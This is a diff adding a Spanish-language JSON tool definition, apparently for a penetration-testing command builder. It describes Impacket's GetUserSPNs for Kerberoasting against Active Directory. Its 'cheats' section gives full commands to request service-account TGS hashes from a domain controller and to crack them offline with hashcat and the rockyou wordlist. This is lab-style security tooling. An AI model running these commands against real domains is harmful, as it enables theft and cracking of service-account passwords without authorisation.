@@ -1,0 +1,46 @@
+{
+ "id": "impacket-getuserspns",
+ "name": "Impacket – GetUserSPNs.py (Kerberoasting)",
+ "category": "Post-explotación / Active Directory",
+ "binary": "impacket-GetUserSPNs",
+ "summary": "Solicita tickets TGS de cuentas de servicio (SPN) para crackear sus contraseñas offline con hashcat/John.",
+ "questions": [
+  {
+   "id": "target",
+   "type": "text",
+   "label": "dominio/usuario:contraseña",
+   "flag": "{v}",
+   "placeholder": "HTB.LOCAL/usuario:Contraseña123",
+   "required": true,
+   "help": "Vale cualquier cuenta válida del dominio, no hace falta ser admin."
+  },
+  {
+   "id": "dc_ip",
+   "type": "text",
+   "label": "IP del controlador de dominio",
+   "flag": "-dc-ip {v}",
+   "placeholder": "10.10.10.10",
+   "required": true
+  },
+  {
+   "id": "request",
+   "type": "bool",
+   "label": "Solicitar y mostrar los hashes TGS (-request)",
+   "flag": "-request",
+   "default": true,
+   "help": "Sin esto solo lista las cuentas con SPN, sin pedir el ticket."
+  },
+  {
+   "id": "outputfile",
+   "type": "text",
+   "label": "Fichero de salida",
+   "flag": "-outputfile {v}",
+   "placeholder": "hashes_kerberoast.txt",
+   "help": "Formato compatible con hashcat -m 13100."
+  }
+ ],
+ "cheats": [
+  {"title": "Kerberoasting básico", "cmd": "impacket-GetUserSPNs -dc-ip 10.10.10.10 HTB.LOCAL/usuario:Contraseña123 -request -outputfile hashes.txt"},
+  {"title": "Crackear los hashes obtenidos", "cmd": "hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt", "note": "13100 = Kerberos 5 TGS-REP etype 23."}
+ ]
+}
